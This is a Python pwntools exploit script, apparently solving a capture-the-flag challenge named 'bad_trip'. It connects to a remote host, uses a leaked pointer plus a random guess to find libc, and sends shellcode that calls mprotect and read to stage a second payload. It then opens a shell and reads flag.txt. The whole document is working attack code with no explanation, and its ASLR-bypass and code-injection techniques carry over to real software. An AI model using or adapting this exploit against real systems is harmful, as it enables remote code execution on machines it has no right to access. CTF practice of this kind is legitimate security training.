#!/usr/bin/env python3

from pwn import *
import secrets

#context.log_level = "debug"
elf = ELF("./bad_trip", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

try:
    #p = elf.process()
    #p = elf.debug(gdbscript="")
    p = remote("172.210.129.230", 1352)

    p.readuntil(b"start with ")

    leak = int(p.readline().decode(), 16)

    leak = 0x700000000000 | (secrets.randbelow(0x1000) << 32) | leak

    libc.address = leak - libc.sym["puts"]

    log.success(f"libc: 0x{libc.address:x}")

    payload = b"\x90" * 50 # nops to overwrite

    payload += asm("mov rsp, 0x69696b6500") # new stack

    payload += asm("mov rdx, 7")
    payload += asm("mov rsi, 4096")
    payload += asm("movabs rdi, 0x1337131000")
    payload += asm(f"mov rax, 0x{libc.sym["mprotect"]:x}")
    payload += asm("call rax") # mprotect(0x1337131000, 4096, 7)

    payload += asm("mov rdx, 100")
    payload += asm("mov rsi, 0x1337131000")
    payload += asm("mov rdi, 0")
    payload += asm(f"mov rax, 0x{libc.sym["read"]:x}")
    payload += asm("call rax") # read(0, 0x1337131000, 100)

    payload += asm("movabs rax, 0x1337131000")
    payload += asm("jmp rax") # jmp 0x1337131000

    p.readuntil(b"code >> ")
    p.sendline(payload)

    p.sendline(asm(shellcraft.sh()))

    p.clean()

    p.sendline(b"/bin/cat flag.txt")

    print(p.readline().decode())

    p.interactive()
except:
    pass
